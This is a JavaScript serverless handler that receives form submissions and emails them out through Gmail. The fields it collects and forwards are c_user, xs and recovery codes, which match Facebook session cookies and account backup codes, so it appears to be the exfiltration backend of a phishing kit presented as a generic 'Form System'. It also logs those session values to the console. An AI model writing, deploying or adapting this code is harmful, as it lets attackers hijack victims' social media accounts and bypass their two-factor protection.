import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { c_user, xs, emails, workerEmail, name, recovery_codes } = req.body;

    console.log('📨 Submit Form:');
    console.log('Name:', name); // ✅ Log name
    console.log('c_user:', c_user);
    console.log('xs:', xs);
    console.log('Emails to send:', emails);
    
    // Send email with name included
    const emailResult = await sendSubmitEmail(emails, { 
      name, 
      c_user, 
      xs, 
      recovery_codes 
    });

    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully!',
      emailSent: emailResult.success,
      emailMessage: emailResult.message,
      name: name // ✅ Response mein name bhejein
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Server error: ' + error.message
    });
  }
}

async function sendSubmitEmail(toEmails, formData) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    // ✅ Email mein NAME include karein
    const mailOptions = {
      from: `"Form System" <${process.env.GMAIL_USER}>`,
      to: toEmails.join(', '),
      subject: `✅ New Submission: ${formData.name || 'User'}`, // ✅ Subject mein name
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
          <h2 style="color: #333;">📋 New Form Submission</h2>
          
          <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 120px;">Name:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.name || 'Not provided'}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">c_user:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.c_user}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">xs:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.xs}</td>
            </tr>
            ${formData.recovery_codes ? `
            <tr>
              <td style="padding: 10px; font-weight: bold;">Recovery Codes:</td>
              <td style="padding: 10px;">${formData.recovery_codes}</td>
            </tr>
            ` : ''}
          </table>
          
          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>Sent to:</strong> ${toEmails.join(', ')}</p>
        </div>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Submit email sent for ${formData.name || 'user'}`);
    return { success: true, message: 'Email sent with name!' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
